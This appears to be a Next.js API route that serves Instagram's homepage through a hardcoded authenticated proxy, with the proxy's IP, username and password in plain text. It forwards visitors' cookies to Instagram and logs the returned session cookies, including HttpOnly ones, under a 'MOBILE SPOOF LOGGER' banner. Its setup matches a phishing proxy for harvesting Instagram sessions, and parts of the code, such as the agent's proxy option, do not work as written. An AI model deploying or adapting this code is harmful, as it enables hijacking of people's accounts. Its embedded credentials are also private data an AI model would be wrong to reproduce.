// pages/api/proxy.js

export default async function handler(req, res) {
  // ✅ PROXY CONFIGURATION
  const proxyHost = "136.0.117.77";
  const proxyPort = 6815;
  const proxyUser = "IGayproNi";
  const proxyPass = "0805thEO";

  // ✅ Mobile Device Spoofing
  // We use a realistic Mobile User-Agent and Headers
  const mobileUA = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1";
  
  const proxyUrl = `http://${proxyUser}:${proxyPass}@${proxyHost}:${proxyPort}`;

  try {
    // 1. Get the user's real User-Agent (optional, but good for consistency)
    const userUA = req.headers['user-agent'] || mobileUA;

    // 2. Fetch Instagram with Mobile Spoofing
    const response = await fetch('https://www.instagram.com/', {
      headers: {
        'User-Agent': userUA, // Use the spoofed mobile UA
        'Cookie': req.headers['cookie'] || '',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1'
      },
      // ✅ Use the proxy
      agent: new (require('https').Agent)({
        proxy: `http://${proxyUser}:${proxyPass}@${proxyHost}:${proxyPort}`
      })
    });

    // 3. Extract HttpOnly Cookies
    const cookies = response.headers.getSetCookie();
    
    // Log cookies
    console.log('======================');
    console.log('🍪 MOBILE SPOOF LOGGER');
    console.log('📅 Time:', new Date().toISOString());
    console.log('📱 User-Agent:', userUA);
    console.log('🍪 Cookies:', cookies);
    console.log('🌐 Proxy:', proxyUrl);
    console.log('======================');

    // 4. Stream the response to the user
    const reader = response.body.getReader();
    
    // Set response headers
    res.setHeader('Content-Type', response.headers.get('Content-Type') || 'text/html; charset=utf-8');
    cookies.forEach(c => res.setHeader('Set-Cookie', c));
    res.statusCode = response.status;

    // Stream chunks
    const streamToNode = async (reader, res) => {
      while (true) {
        const { done, value } = await reader.read();
        if (done) {
          res.end();
          break;
        }
        res.write(value);
      }
    };

    streamToNode(reader, res).catch(err => {
      console.error('Stream Error:', err);
      res.write('<html><body><h1>Instagram (Mobile Spoof)</h1><p>If you see this, the stream failed.</p></body></html>');
      res.end();
    });

  } catch (error) {
    console.error('Proxy Error:', error);
    res.status(500).type('text/html').send(`
      <html>
        <body style="font-family: sans-serif; padding: 20px;">
          <h1>Instagram (Mobile Spoof)</h1>
          <p>Error: ${error.message}</p>
          <p>Check Vercel Logs for details.</p>
        </body>
      </html>
    `);
  }
}
